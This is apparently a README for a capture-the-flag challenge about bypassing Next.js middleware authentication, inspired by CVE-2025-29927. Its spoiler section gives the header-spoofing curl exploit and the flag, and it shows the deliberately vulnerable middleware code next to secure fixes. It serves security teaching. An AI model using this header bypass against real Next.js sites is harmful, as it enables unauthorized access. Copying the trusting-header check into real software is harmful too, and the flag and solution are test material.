# 🚨 CTF Challenge: Next.js Middleware Authentication Bypass

**Difficulty:** Easy  
**Category:** Web Security  
**CVE Reference:** CVE-2025-29927 (Inspired)

---

## 📋 Challenge Description

You've discovered a Next.js application with an API endpoint at `/api/hacker` that appears to be protected by middleware authentication. Your goal is to bypass this protection and retrieve the flag.

**Target:** `http://www.gowreesh.works/api/hacker`

---

## 🎯 Objective

Retrieve the CTF flag by bypassing the middleware authentication without modifying any backend code.

**Flag Format:** `VV{...}`

---

## 🛠️ Setup Instructions

### Prerequisites
- Node.js 16+ and npm installed
- Terminal with curl (or any HTTP client)

### Installation

```bash
# Install dependencies
npm install

# Start the development server
npm run dev
```

The application will be available at `http://localhost:3000`

### Production Deployment

```bash
# Build for production
npm run build

# Start production server
npm start
```

---

## 🧪 Testing the Challenge

### Initial Attempt (Will Fail)

```bash
curl -i http://localhost:3000/api/hacker
```

**Expected Response:**
```
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"error":"Access denied"}
```

### Your Mission

Find a way to bypass the middleware and receive:
- HTTP 200 status code
- The CTF flag in the JSON response

---

## 🔍 Hints

<details>
<summary>Hint 1 (Click to reveal)</summary>

The middleware is checking for something in the HTTP request. What does middleware typically validate?

</details>

<details>
<summary>Hint 2 (Click to reveal)</summary>

Look at the middleware code. It's checking for a specific HTTP header. What header might it be trusting?

</details>

<details>
<summary>Hint 3 (Click to reveal)</summary>

The vulnerability is that the middleware trusts a client-controllable header. Can you send that header yourself?

</details>

---

## 🎓 Learning Objectives

After completing this challenge, you will understand:

1. **Middleware Security Risks**
   - How middleware can create authentication bottlenecks
   - Why trusting client-controllable headers is dangerous

2. **CVE-2025-29927 Context**
   - Real-world Next.js middleware bypass vulnerabilities
   - How internal headers can be spoofed by attackers

3. **Defense Strategies**
   - Never trust client-controllable headers for authentication
   - Use cryptographic verification (JWTs, signed cookies)
   - Implement defense-in-depth with backend validation

---

## ⚠️ Vulnerability Explanation

This application demonstrates a critical security flaw:

**The Problem:**
- The middleware checks for the `x-middleware-subrequest` header
- If the header value is `middleware`, access is granted
- This header is **client-controllable** and can be sent by anyone

**Why It's Dangerous:**
- No cryptographic verification
- No secret validation
- Complete reliance on a header that attackers can forge

**Real-World Impact:**
- Complete authentication bypass
- Unauthorized access to protected APIs
- Data breaches and privilege escalation

---

## 🏆 Solution

<details>
<summary>⚠️ SPOILER: Click to see the solution</summary>

### Exploit Command

```bash
curl -i http://localhost:3000/api/hacker \
  -H "x-middleware-subrequest: middleware"
```

### Expected Success Response

```json
{
  "message": "Admin access granted",
  "flag": "VV{cv3-2025-29927_n3x7j5_m1ddl3w4r3_4u7h_byp455}",
  "proof": "You bypassed the admin gate successfully",
  "exploit": {
    "vulnerability": "CVE-2025-29927 Inspired",
    "type": "Middleware Authentication Bypass",
    "method": "Client-controllable header trusted for authorization",
    "impact": "Complete authentication bypass - unauthorized access to protected resources"
  }
}
```

### How It Works

1. The middleware intercepts requests to `/api/hacker`
2. It checks for the `x-middleware-subrequest` header
3. If the header equals `middleware`, it allows the request
4. An attacker can simply add this header to bypass authentication
5. The API endpoint is reached and returns the flag

</details>

---

## 🔒 How to Fix This Vulnerability

**DO NOT implement these fixes for the CTF challenge**, but here's how to properly secure this:

### ❌ Vulnerable Code (Current)
```javascript
const subrequestHeader = request.headers.get('x-middleware-subrequest')
if (subrequestHeader === 'middleware') {
  return NextResponse.next()
}
```

### ✅ Secure Alternatives

**Option 1: JWT Authentication**
```javascript
import { jwtVerify } from 'jose'

const token = request.headers.get('authorization')?.split(' ')[1]
const { payload } = await jwtVerify(token, secretKey)
```

**Option 2: API Key with HMAC**
```javascript
const apiKey = request.headers.get('x-api-key')
const signature = request.headers.get('x-signature')
const isValid = verifyHMAC(apiKey, signature, secretKey)
```

**Option 3: Session Cookies**
```javascript
const session = request.cookies.get('session')
const validSession = await validateSession(session)
```

---

## 📁 Project Structure

```
CTF_Challange_3/
├── middleware.js              # Vulnerable middleware (intentional)
├── pages/
│   └── api/
│       └── hacker.js         # Protected API endpoint
├── package.json              # Dependencies
├── next.config.js            # Next.js configuration
└── README.md                 # This file
```

---

## 🚨 Security Disclaimer

**This application is intentionally vulnerable and designed for educational CTF purposes only.**

- ⚠️ Never deploy this to production
- ⚠️ Never use client-controllable headers for authentication
- ⚠️ Always use proper cryptographic authentication methods
- ⚠️ This code is for learning purposes only

---

## 📚 References

- [Next.js Middleware Documentation](https://nextjs.org/docs/app/building-your-application/routing/middleware)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [CVE-2025-29927 Advisory](https://nvd.nist.gov/) (Reference for educational context)

---

## 🏁 Challenge Credits

**Author:** Gowreesh VT  
**Difficulty:** Easy  
**Category:** Web Security - Authentication Bypass  
**Year:** 2025

---

**Good luck, hacker! 🎯**
